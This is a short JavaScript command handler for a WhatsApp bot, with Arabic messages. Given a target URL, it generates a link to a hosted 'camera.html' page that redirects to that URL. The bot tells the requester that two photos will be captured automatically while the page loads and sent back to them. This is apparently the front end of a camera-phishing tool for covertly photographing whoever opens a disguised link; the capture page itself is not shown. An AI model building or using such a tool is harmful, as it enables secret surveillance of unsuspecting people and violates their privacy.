const path = require('path');

module.exports = async ({ text, reply, sock, from, msg, sessionId }) => {
  if (!text.toLowerCase().startsWith('camera')) return;

  const parts = text.split(' ');
  if (parts.length < 2) {
    return reply('❌ أرسل الرابط بعد الأمر.\nمثال: camera https://example.com');
  }

  const targetUrl = parts[1];

  // ✅ استخدام الرابط الأساسي من Render أو المحلي
  const baseUrl = process.env.BASE_URL || `https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost:3000'}`;

  const pageUrl = `${baseUrl}/camera.html?redirect=${encodeURIComponent(targetUrl)}&chat=${encodeURIComponent(from)}&sessionId=${encodeURIComponent(sessionId)}`;

  try {
    await sock.sendMessage(from, {
      text: `📸 افتح الرابط للسماح بالكاميرا:\n${pageUrl}\n\n> سيتم التقاط صورتين تلقائيًا أثناء التحميل وإرسالها إليك.`
    }, { quoted: msg });
  } catch (err) {
    console.error('❌ خطأ في إرسال رابط الكاميرا:', err.message);
    await reply('⚠️ حدث خطأ أثناء إنشاء رابط الكاميرا.');
  }
};
